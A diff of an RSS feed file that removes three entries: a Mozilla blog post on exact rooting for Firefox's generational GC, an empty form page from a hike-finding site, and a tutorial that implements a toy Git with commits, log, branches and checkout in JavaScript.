@@ -14,692 +14,6 @@ myread
 myread
 </description>
 <item>
-<author>
-Nicholas Nethercote
-</author>
-<link>
-https://blog.mozilla.org/nnethercote/2014/01/20/a-big-step-towards-generational-and-compacting-gc/
-</link>
-<description>
-&lt;div&gt;&lt;div class=&quot;entry-content&quot;&gt;
-						&lt;p&gt;People frequently ask me for status updates on generational GC, and I usually say I&amp;#x2019;ll tell them when something notable happens. Well, something notable just happened: &lt;a href=&quot;https://groups.google.com/forum/#!topic/mozilla.dev.platform/pWuGWdZgQL0&quot;&gt;exact rooting landed&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;What is exact rooting? In order to support generational and/or compacting GC, you need to be able to move GC-allocated things such as objects around. This means you can&amp;#x2019;t have raw C++ pointers to any objects that might move; instead, you need some kind of indirect pointer that can be updated when necessary.&lt;/p&gt;
-&lt;p&gt;Unfortunately, both the JS engine and Gecko have a &lt;em&gt;lot&lt;/em&gt; of pointers to GC-allocated things. The process of checking and converting them has been the main part of a task called &amp;#x201C;exact rooting&amp;#x201D;, and that&amp;#x2019;s what just finished. This has required an enormous amount of what is essentially very tedious work. Jim Blandy summarized it nicely, as follows.&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;I&amp;#x2019;ve never heard of a major project escaping from conservative GC once it had entered that state of sin; nor have I heard of anyone implementing a moving collector after starting with a non-moving collector. So, doing *both* is impressive. I hope it pays off big!&lt;/p&gt;&lt;/blockquote&gt;
-&lt;p&gt;Major kudos to Terrence Cole, Steve Fink, Jon Coppeard, Brian Hackett, and the small army of other helpers who did this. Now that they&amp;#x2019;ve finished eating this gigantic serving of vegetables, they can move onto dessert, i.e. making the GC generational and compacting.&lt;/p&gt;
-											&lt;/div&gt;
-
-					&lt;/div&gt;
-</description>
-<title>
-A big step towards Firefox generational and compacting GC
-</title>
-</item>
-<item>
-<link>
-http://hike.io
-</link>
-<description>
-&lt;div&gt;
-	&lt;div class=&quot;container&quot;&gt;
-		&lt;header&gt;
-			
-			
-			
-		&lt;/header&gt;
-
-		
-
-		
-
-		&lt;div class=&quot;add-page-container&quot;&gt;
-	&lt;article id=&quot;add-page&quot; class=&quot;add-page modal-input-dialog&quot;&gt;
-		
-		
-			&lt;div&gt;
-				&lt;p&gt;
-					&lt;label for=&quot;name&quot;&gt;Name&lt;/label&gt;
-					
-				&lt;/p&gt;
-				&lt;p&gt;
-					&lt;label for=&quot;locality&quot;&gt;Location&lt;/label&gt;
-					
-				&lt;/p&gt;
-				&lt;p&gt;
-					&lt;label for=&quot;distance&quot;&gt;Distance&lt;/label&gt;
-					&lt;span class=&quot;units&quot;&gt;miles&lt;/span&gt;
-				&lt;/p&gt;
-				&lt;p&gt;
-					&lt;label for=&quot;elevationGain&quot;&gt;Elev. Gain&lt;/label&gt;&lt;label for=&quot;elevationGain&quot;&gt;Elevation Gain&lt;/label&gt;
-					&lt;span class=&quot;units&quot;&gt;feet&lt;/span&gt;
-				&lt;/p&gt;
-				&lt;p&gt;
-					&lt;label for=&quot;elevationMax&quot;&gt;Elev. Max&lt;/label&gt;&lt;label for=&quot;elevationMax&quot;&gt;Elevation Max&lt;/label&gt;
-					&lt;span class=&quot;units&quot;&gt;feet&lt;/span&gt;
-				&lt;/p&gt;
-				&lt;p class=&quot;latitude-and-longitude&quot;&gt;
-					&lt;label for=&quot;latitude&quot;&gt;Lat. / Lng.&lt;/label&gt;
-					
-					
-					
-				&lt;/p&gt;
-				
-			&lt;/div&gt;
-		
-	&lt;/article&gt;
-	&lt;div class=&quot;add-page-map&quot;&gt;
-		&lt;div class=&quot;banner&quot;&gt;
-			&lt;h3&gt;Select a primary location.&lt;/h3&gt;
-			
-		&lt;/div&gt;
-
-		
-	&lt;/div&gt; 
-&lt;/div&gt;
-
-		
-		&lt;footer&gt;
-			&lt;a href=&quot;http://hike.io/hikes&quot;&gt;&lt;h4&gt;HIKES&lt;/h4&gt;&lt;/a&gt;
-			&lt;a&gt;&lt;h4&gt;CONTACT&lt;/h4&gt;&lt;/a&gt;
-			&lt;a href=&quot;http://hike.io/about&quot;&gt;&lt;h4&gt;ABOUT&lt;/h4&gt;&lt;/a&gt;
-		&lt;/footer&gt;
-	&lt;/div&gt;
-
-	
-	
-	
-	
-	
-	
-	
-&lt;/div&gt;
-
-</description>
-<title>
-Show HN: Free, open-source site for finding beautiful hikes
-</title>
-</item>
-<item>
-<link>
-http://kushagragour.in/blog/2014/01/build-git-learn-git/
-</link>
-<description>
-&lt;div&gt;&lt;div class=&quot;post-content&quot;&gt;&lt;p&gt;If you are reading this post, you probably are using Git or want to use Git. I am a big fan of Git and also &lt;a href=&quot;http://teropa.info/blog/2013/11/03/make-your-own-angular-part-1-scopes-and-digest.html&quot;&gt;those posts&lt;/a&gt; where people &lt;a href=&quot;http://modernjavascript.blogspot.in/2013/08/promisesa-understanding-by-doing.html&quot;&gt;implement some piece of an existing technology&lt;/a&gt; in order to understand how their work in the core. Point being that if you have implemented something, you obviously know how it works, right? This is one such post written to spread my love for Git. &lt;strong&gt;Yes, we&amp;#x2019;ll implement Git!&lt;/strong&gt;&amp;#x2026;in JavaScript.&lt;/p&gt;
-
-&lt;p&gt;This part implements basics of the following concepts:&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;Repository.&lt;/li&gt;
-
-&lt;li&gt;Commit.&lt;/li&gt;
-
-&lt;li&gt;Commit chaining.&lt;/li&gt;
-
-&lt;li&gt;Branch.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;All the code written is available in a Github repo:&lt;/p&gt;
-
-&lt;p&gt;&lt;a class=&quot;button button-big&quot; href=&quot;https://github.com/chinchang/build-git-learn-git/&quot;&gt;Github Repo&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;what_is_git&quot;&gt;What is Git?&lt;/h3&gt;
-
-&lt;p&gt;There is a very simple definition of Git at &lt;a href=&quot;https://www.kernel.org/pub/software/scm/git/docs/user-manual.html#repositories-and-branches&quot;&gt;kernel.org&lt;/a&gt;:&lt;/p&gt;
-&lt;blockquote&gt;
-Git is best thought of as a tool for storing the history of a collection of files.
-&lt;/blockquote&gt;
-&lt;p&gt;Yeah, that is essentially why one uses Git&amp;#x2026;to maintain a history of changes in a project.&lt;/p&gt;
-
-&lt;h3 id=&quot;repository_repo&quot;&gt;Repository (repo)&lt;/h3&gt;
-
-&lt;p&gt;When you want to use Git in your project, you create something called a &lt;strong&gt;Repository&lt;/strong&gt;. Now we could refer the &lt;a href=&quot;https://www.kernel.org/pub/software/scm/git/docs/gitglossary.html&quot;&gt;Git documentation&lt;/a&gt; which defines a repo as follows:&lt;/p&gt;
-&lt;blockquote&gt;
-A collection of refs together with an object database containing all objects which are reachable from the refs, possibly accompanied by meta data from one or more porcelains. A repository can share an object database with other repositories via alternates mechanism.
-&lt;/blockquote&gt;
-&lt;p&gt;Well, that is too much to grasp, isn&amp;#x2019;t it? And that is not what we are here for. So lets make things simple. Consider a Git repository as a collection of everything related to Git. So when you make a project folder a Git repo, Git basically creates some of its internal stuff there and encapsulates them into it. Having said that, lets make a simple class called &lt;code&gt;Git&lt;/code&gt; which will basically represent a repo.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Git(name) {
-	this.name = name; // Repo name
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Great! Now making a repo simply requires us to instantiate the &lt;code&gt;Git&lt;/code&gt; class passing in the name of the repo:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-var repo = new Git('my-repo');
-
-// Actual command:
-// &amp;gt; git init
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&quot;commit&quot;&gt;Commit&lt;/h3&gt;
-
-&lt;p&gt;Next concept one needs to know about is a &lt;strong&gt;Commit&lt;/strong&gt;. In very simple terms, a commit is a snapshot of your project&amp;#x2019;s contents. It is these commits which when chained together form the history of your project.&lt;/p&gt;
-
-&lt;p&gt;From the looks of it, a simple &lt;code&gt;Commit&lt;/code&gt; class would have and &lt;em&gt;id&lt;/em&gt; to reference it and a &lt;em&gt;change&lt;/em&gt; containing the snapshot of change made. Understanding how a change is actually stored is beyond the scope of this implementation. So lets drop the &lt;em&gt;change&lt;/em&gt; part and assume that every commit has the change with it:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Commit(id) {
-	this.id = id;
-	// Assume that 'this' has a 'change' property too.
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;In Git, when you commit after making some changes, you can give it a message which describes the change you are commiting. This is called the &lt;em&gt;commit message&lt;/em&gt; which we&amp;#x2019;ll add to our &lt;code&gt;Commit&lt;/code&gt; class:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Commit(id, message) {
-	this.id = id;
-	this.message = message;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Lets add the ability on our &lt;code&gt;Git&lt;/code&gt; class to create a commit or commit (verb):&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.commit = function (message) {
-	var commit = new Commit();
-	return commit;
-};
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;We add a function called &lt;code&gt;commit&lt;/code&gt; on the &lt;code&gt;Git&lt;/code&gt; prototype. It accepts a string message, creates a new &lt;strong&gt;Commit&lt;/strong&gt; instance and returns it. Note that we are not passing in anything yet in the &lt;code&gt;Commit&lt;/code&gt; constructor. We need an id to give to the new commit. We&amp;#x2019;ll make the &lt;code&gt;Git&lt;/code&gt; class keep track of the commit ids by keeping a counter called &lt;code&gt;lastCommitId&lt;/code&gt; with it:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Git() {
-	this.lastCommitId = -1;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Note: In actual Git, commit id is a 40-hexdigit number also called as &amp;#x201C;SHA-1 id&amp;#x201D;. But for keeping things simple we are using integers here.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code&gt;commit&lt;/code&gt; function can now pass a new id (incremented) along with the message in the constructor:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.commit = function (message) {
-	var commit = new Commit(++this.lastCommitId, message);
-	return commit;
-};
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;We can now commit anytime like so:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-repo.commit('Make commit work');
-
-// Actual command:
-// &amp;gt; git commit -m &quot;Make commit work&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&quot;match_your_code&quot;&gt;Match your code&lt;/h4&gt;
-
-&lt;p&gt;At this point you should have your implementation that looks like &lt;a href=&quot;https://github.com/chinchang/build-git-learn-git/blob/ffb353b30e5eee92190e42a989c14ca0a74bb65a/git-part1.js&quot;&gt;the one here&lt;/a&gt;. I have wrapped the whole code in an Immediately invoking function expression (IIFE) and exposed the &lt;code&gt;Git&lt;/code&gt; class manually to keep global space clean.&lt;/p&gt;
-
-&lt;h3 id=&quot;commit_history__chaining_the_commits&quot;&gt;Commit history - chaining the commits&lt;/h3&gt;
-
-&lt;p&gt;Git has a command called &lt;code&gt;log&lt;/code&gt; which shows the commit history in reverse chronological order, i.e. first the lastest commit followed by previous ones.&lt;/p&gt;
-
-&lt;p&gt;Lets implement this &lt;code&gt;log&lt;/code&gt; command as a method on our &lt;code&gt;Git&lt;/code&gt; class. Our log function will return an array of commits in reverse chronological order.&lt;/p&gt;
-
-&lt;p&gt;Here is a simple test which should pass for our log function:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-console.log('Git.log() test');
-var repo = new Git('test');
-repo.commit('Initial commit');
-repo.commit('Change 1');
-
-var log = repo.log();
-console.assert(log.length === 2); // Should have 2 commits.
-console.assert(!!log[0] &amp;amp;&amp;amp; log[0].id === 1); // Commit 1 should be first.
-console.assert(!!log[1] &amp;amp;&amp;amp; log[1].id === 0); // And then Commit 0.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Onto the implementation.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.log = function () {
-	var history = []; // array of commits in reverse order.
-
-	// 1. Start from last commit
-	// 2. Go back tracing to the first commit
-	// 3. Push in `history`
-
-	return history;
-};
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The &lt;code&gt;log&lt;/code&gt; function has only pseudo code right now in form of comments which tell us the logic of the function. To implement such logic 2 requirements arise:&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;We need to know the last commit.&lt;/li&gt;
-
-&lt;li&gt;Every commit should somehow know which commit was made before it.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;We have a failing test case right now: &lt;a class=&quot;jsbin-embed&quot; href=&quot;http://jsbin.com/AqAbEmuN/1/embed?js,console&quot;&gt;Build Git - Learn Git (part 1)&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Lets take up the first requirement: Knowing the last commit.&lt;/p&gt;
-
-&lt;p&gt;Git has something called a &lt;strong&gt;HEAD&lt;/strong&gt;. In actual Git it is simply a pointer to your current branch. But since we have not covered branches yet, we&amp;#x2019;ll relax the definition here&amp;#x2026;temporarily.&lt;/p&gt;
-
-&lt;p&gt;What we&amp;#x2019;ll do is add a property called &lt;code&gt;HEAD&lt;/code&gt; in the &lt;code&gt;Git&lt;/code&gt; class which will reference the last commit&amp;#x2019;s &lt;code&gt;Commit&lt;/code&gt; object:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Git(name) {
-	this.name = name; // Repo name
-	this.lastCommitId = -1; // Keep track of last commit id.
-	this.HEAD = null; // Reference to last Commit.
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;HEAD&lt;/code&gt; will be updated everytime a commit is made i.e. in the &lt;code&gt;commit()&lt;/code&gt; function.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.commit = function (message) {
-	// Increment last commit id and pass into new commit.
-	var commit = new Commit(++this.lastCommitId, message);
-
-	// Update HEAD and current branch.
-	this.HEAD = commit;
-
-	return commit;
-};
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Simple! Now we always know which was the last commit made.&lt;/p&gt;
-
-&lt;p&gt;Getting on the 2nd requirement: Every commit should somehow know which commit was made before it. This brings up the concept of &lt;strong&gt;parent&lt;/strong&gt; in Git. Commits in Git are kept together in form a data structure called &lt;a href=&quot;http://en.wikipedia.org/wiki/Linked_list&quot;&gt;&lt;strong&gt;Linked Lists&lt;/strong&gt;&lt;/a&gt;. Simply put, in a Linked List every item stores with itself a pointer to its parent item. This is done so that from every item, we can reach its parent item and keep following the pointers to get an ordered list. This diagram from Wikipedia will will make more sense:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://upload.wikimedia.org/wikipedia/commons/6/6d/Singly-linked-list.svg&quot; alt=&quot;Linked list&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;For this, we add a property called &lt;code&gt;parent&lt;/code&gt; in the &lt;code&gt;Commit&lt;/code&gt; class which will reference its parent commit object:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Commit(id, parent, message) {
-	this.id = id;
-	this.parent = parent;
-	this.message = message;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The parent commit also needs to be passed into the &lt;code&gt;Commit&lt;/code&gt; constructor. If you think, for a new commit what is the parent/previous commit? Yes, the current commit or the &lt;code&gt;HEAD&lt;/code&gt;.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.commit = function (message) {
-	// Increment last commit id and pass into new commit.
-	var commit = new Commit(++this.lastCommitId, this.HEAD, message);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Having our requirements in place, lets implement the &lt;code&gt;log()&lt;/code&gt; function:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.log = function () {
-	// Start from HEAD
-	var commit = this.HEAD,
-		history = [];
-
-	while (commit) {
-		history.push(commit);
-		// Keep following the parent
-		commit = commit.parent;
-	}
-
-	return history;
-};
-
-// Can be used as repo.log();
-// Actual command:
-// &amp;gt; git log
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Our test should pass now: &lt;a class=&quot;jsbin-embed&quot; href=&quot;http://jsbin.com/AqAbEmuN/2/embed?js,console&quot;&gt;Build Git - Learn Git (part 1)&lt;/a&gt;&lt;/p&gt;
-
-&lt;h4 id=&quot;match_your_code_2&quot;&gt;Match your code&lt;/h4&gt;
-
-&lt;p&gt;At this point our code looks &lt;a href=&quot;https://github.com/chinchang/build-git-learn-git/blob/116871ab54376e489af538fa1ba1a7e04359e704/git-part1.js&quot;&gt;like this&lt;/a&gt;. Next up is Branches!&lt;/p&gt;
-
-&lt;h3 id=&quot;branches&quot;&gt;Branches&lt;/h3&gt;
-
-&lt;p&gt;Hurray, we have reached at the most interesting &amp;amp; powerful feature of Git: Branches. So what is a Branch and what is it used for?&lt;/p&gt;
-
-&lt;p&gt;Imagine this scenario, you are working on a project making commits now and then. At some point may be you or one of your teammate wants to experiment something on your current work, say a different algorithm. You could surely keep making those experimental commits, but remember this was your experiment and hence not guaranteed to be kept in the main project. This way you polluted your main project.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Branches to the rescue&lt;/strong&gt;. What you need to do here is branch out from your current line of commits so that the commits you make do not pollute the main line of development.&lt;/p&gt;
-
-&lt;p&gt;To quote the definition at kernel.org:&lt;/p&gt;
-&lt;blockquote&gt;
-A &quot;branch&quot; is an active line of development. The most recent commit on a branch is referred to as the tip of that branch. The tip of the branch is referenced by a branch head, which moves forward as additional development is done on the branch. A single git repository can track an arbitrary number of branches
-&lt;/blockquote&gt;
-&lt;p&gt;Lets understand what a branch is. A branch is nothing but a mere pointer to some commit. Seriously, that is it. That is what makes branches in Git so lightweight and use-n-throw type. You may say &lt;code&gt;HEAD&lt;/code&gt; was exactly this. You are right. The only difference being that &lt;code&gt;HEAD&lt;/code&gt; is just one (because at a given time you are only on a single commit) but branches can be many, each pointing to a commit.&lt;/p&gt;
-
-&lt;p&gt;The &lt;strong&gt;&amp;#x2018;master&amp;#x2019; branch&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Each Git repo when initialized comes with a default branch called &lt;em&gt;master&lt;/em&gt;. Lets understand branches through some diagrams from &lt;a href=&quot;http://git-scm.com/book/en/Git-Branching-What-a-Branch-Is&quot;&gt;git-scm.com&lt;/a&gt;:&lt;/p&gt;
-
-&lt;p&gt;You create a new repository and make some commits: &lt;img src=&quot;http://git-scm.com/figures/18333fig0303-tn.png&quot; alt=&quot;Just master&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;Then you create a new branch called &lt;em&gt;testing&lt;/em&gt;: &lt;img src=&quot;http://git-scm.com/figures/18333fig0304-tn.png&quot; alt=&quot;New branch testing&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing much, just a new pointer called &lt;em&gt;testing&lt;/em&gt; to the lastest commit. How does Git knows which branch you are on? Here comes the &lt;code&gt;HEAD&lt;/code&gt;. &lt;code&gt;HEAD&lt;/code&gt; points to the current branch: &lt;img src=&quot;http://git-scm.com/figures/18333fig0306-tn.png&quot; alt=&quot;HEAD pointing testing&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;Now comes interesting part. Being on &lt;em&gt;testing&lt;/em&gt; branch you make a commit. Notice what happens:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://git-scm.com/figures/18333fig0307-tn.png&quot; alt=&quot;testing moves&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;From now on, the &lt;em&gt;testing&lt;/em&gt; branch/pointer only moves and not &lt;em&gt;master&lt;/em&gt;. Looking at the above diagram and keeping our &lt;code&gt;log()&lt;/code&gt; algorithm in mind, lets see what history would each branch return.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;em&gt;testing branch&lt;/em&gt;: Currently we are on &lt;em&gt;testing&lt;/em&gt; branch. Moving backwards from &lt;code&gt;HEAD&lt;/code&gt;(commit &lt;em&gt;c2b9e&lt;/em&gt;) and tracking the visible linkages, we get the history as: |c2b9e| -&amp;gt; |f30ab| -&amp;gt; |34ac2| -&amp;gt; |98ca9|&lt;/p&gt;
-&lt;/li&gt;
-
-&lt;li&gt;
-&lt;p&gt;&lt;em&gt;master branch&lt;/em&gt;: If we switch to &lt;em&gt;master&lt;/em&gt; branch, we would have a state as follows: &lt;img src=&quot;http://git-scm.com/figures/18333fig0308-tn.png&quot; alt=&quot;Back to master&quot;&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Now tracing back from &lt;code&gt;HEAD&lt;/code&gt; gives us the history as: |f30ab| -&amp;gt; |34ac2| -&amp;gt; |98ca9|&lt;/p&gt;
-
-&lt;p&gt;You see what we acheived? We were able to make some experimental changes/commits without polluting the main branch (master) history using branches. Isn&amp;#x2019;t that cool!!!&lt;/p&gt;
-
-&lt;p&gt;Enough said, lets code. First lets make a new class for a branch. A branch, as we saw, has a name and a reference to some commit:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Branch(name, commit) {
-	this.name = name;
-	this.commit = commit;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;By default, Git gives you a branch called &lt;em&gt;master&lt;/em&gt;. Lets create one:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Git(name) {
-	this.name = name; // Repo name
-	this.lastCommitId = -1; // Keep track of last commit id.
-	this.HEAD = null; // Reference to last Commit.
-
-	var master = new Branch('master', null); // null is passed as we don't have any commit yet.
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Remember we changed the meaning of &lt;code&gt;HEAD&lt;/code&gt; in the beginning as we were still to cover branches? Its time we make it do what its meant for i.e. reference the current branch (&lt;em&gt;master&lt;/em&gt; when repo is created):&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Git(name) {
-	this.name = name; // Repo name
-	this.lastCommitId = -1; // Keep track of last commit id.
-
-	var master = new Branch('master', null); // null is passed as we don't have any commit yet.
-
-	this.HEAD = master; // HEAD points to current branch.
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This will require certain changes in the &lt;code&gt;commit()&lt;/code&gt; function as &lt;code&gt;HEAD&lt;/code&gt; is no longer referencing a &lt;code&gt;Commit&lt;/code&gt; but a &lt;code&gt;Branch&lt;/code&gt; now:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.commit = function (message) {
-	// Increment last commit id and pass into new commit.
-	var commit = new Commit(++this.lastCommitId, this.HEAD.commit, message);
-
-	// Update the current branch pointer to new commit.
-	this.HEAD.commit = commit;
-
-	return commit;
-};
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;And a minor change in &lt;code&gt;log&lt;/code&gt; function. We start from &lt;code&gt;HEAD.commit&lt;/code&gt; now:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.log = function () {
-	// Start from HEAD commit
-	var commit = this.HEAD.commit,
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Everything works as before. To really verify what we deduced in theory by calculating history of those 2 branches above, we need one final method on our &lt;code&gt;Git&lt;/code&gt; class: &lt;strong&gt;checkout&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;To begin with, consider &lt;em&gt;checkout&lt;/em&gt; as switching branches. By default we are on &lt;em&gt;master&lt;/em&gt; branch. If I do something like &lt;code&gt;repo.checkout('testing')&lt;/code&gt;, I should jump to &lt;em&gt;testing&lt;/em&gt; branch&amp;#x2026;provided it is already created. But if its not created already, a new branch with that name should be created. Lets write a test for this method.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-console.log('Git.checkout() test')
-var repo = new Git('test');
-repo.commit('Initial commit');
-
-console.assert(repo.HEAD.name === 'master'); // Should be on master branch.
-repo.checkout('testing');
-console.assert(repo.HEAD.name === 'testing'); // Should be on new testing branch.
-repo.checkout('master');
-console.assert(repo.HEAD.name === 'master'); // Should be on master branch.
-repo.checkout('testing');
-console.assert(repo.HEAD.name === 'testing'); // Should be on testing branch again.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This test fails right now as we don&amp;#x2019;t have a &lt;code&gt;checkout&lt;/code&gt; method yet. Lets write one:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.checkout = function (branchName) {
-	// Check if a branch already exists with name = branchName
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The comment in above code requires that the repo maintains a list of all created branches. So we put a property called &lt;code&gt;branches&lt;/code&gt; on &lt;code&gt;Git&lt;/code&gt; class with initially having only &lt;em&gt;master&lt;/em&gt; in it:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-function Git(name) {
-	this.name = name; // Repo name
-	this.lastCommitId = -1; // Keep track of last commit id.
-	this.branches = []; // List of all branches.
-
-	var master = new Branch('master', null); // No commit yet, so null is passed.
-	this.branches.push(master); // Store master branch.
-
-	this.HEAD = master; // HEAD points to current branch.
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Continuing with the &lt;code&gt;checkout&lt;/code&gt; function now. Taking first case when we find an existing branch, all we need to do is point the &lt;code&gt;HEAD&lt;/code&gt;, the current branch pointer, to that existing branch:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.checkout = function (branchName) {
-	// Loop through all branches and see if we have a branch
-	// called `branchName`.
-	for (var i = this.branches.length; i--;){
-		if (this.branches[i].name === branchName) {
-			// We found an existing branch
-			console.log('Switched to existing branch: ' + branchName);
-			this.HEAD = this.branches[i];
-			return this;
-		}
-	}
-
-	// We reach here when no matching branch is found.
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;I returned &lt;code&gt;this&lt;/code&gt; from that method so that methods can be chanined. Next, incase we don&amp;#x2019;t find a branch with the passed name, we create one just like we did for &lt;em&gt;master&lt;/em&gt;:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-Git.prototype.checkout = function (branchName) {
-	// Loop through all branches and see if we have a branch
-	// called `branchName`.
-	for (var i = this.branches.length; i--;){
-		if (this.branches[i].name === branchName) {
-			// We found an existing branch
-			console.log('Switched to existing branch: ' + branchName);
-			this.HEAD = this.branches[i];
-			return this;
-		}
-	}
-
-	// If branch was not found, create a new one.
-	var newBranch = new Branch(branchName, this.HEAD.commit);
-	// Store branch.
-	this.branches.push(newBranch);
-	// Update HEAD
-	this.HEAD = newBranch;
-
-	console.log('Switched to new branch: ' + branchName);
-	return this;
-
-}
-
-// Actual command:
-// &amp;gt; git checkout existing-branch
-// &amp;gt; git checkout -b new-branch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Eureka! Now our &lt;code&gt;checkout&lt;/code&gt; tests pass :)&lt;/p&gt;
-
-&lt;p&gt;&lt;a class=&quot;jsbin-embed&quot; href=&quot;http://jsbin.com/AqAbEmuN/3/embed?js,console&quot;&gt;Build Git - Learn Git (part 1)&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Now the grand moment for which we created the &lt;code&gt;checkout&lt;/code&gt; function. Verifying the awesomeness of branches through the theory we saw earlier. We&amp;#x2019;ll write one final test to verify the same:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
-console.log('3. Branches test');
-
-var repo = new Git('test');
-repo.commit('Initial commit');
-repo.commit('Change 1');
-
-// Maps the array of commits into a string of commit ids.
-// For [C2, C1,C3], it returns &quot;2-1-0&quot;
-function historyToIdMapper (history) {
-	var ids = history.map(function (commit) {
-		return commit.id;
-	});
-	return ids.join('-');
-}
-
-console.assert(historyToIdMapper(repo.log()) === '1-0'); // Should show 2 commits.
-
-repo.checkout('testing');
-repo.commit('Change 3');
-
-console.assert(historyToIdMapper(repo.log()) === '2-1-0'); // Should show 3 commits.
-
-repo.checkout('master');
-console.assert(historyToIdMapper(repo.log()) === '1-0'); // Should show 2 commits. Master unpolluted.
-
-repo.commit('Change 3');
-console.assert(historyToIdMapper(repo.log()) === '3-1-0'); // Continue on master with 4th commit.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This test basically represents the diagrams we saw earlier explaining the working of branches. Lets see if our implementation is inline with the theory:&lt;/p&gt;
-
-&lt;p&gt;&lt;a class=&quot;jsbin-embed&quot; href=&quot;http://jsbin.com/AqAbEmuN/4/embed?js,console&quot;&gt;Build Git - Learn Git (part 1)&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Wonderful! Our implementation is right. The final code for this part can be found in GIT repo: &lt;code&gt;git-part1.js&lt;/code&gt;.&lt;/p&gt;
-
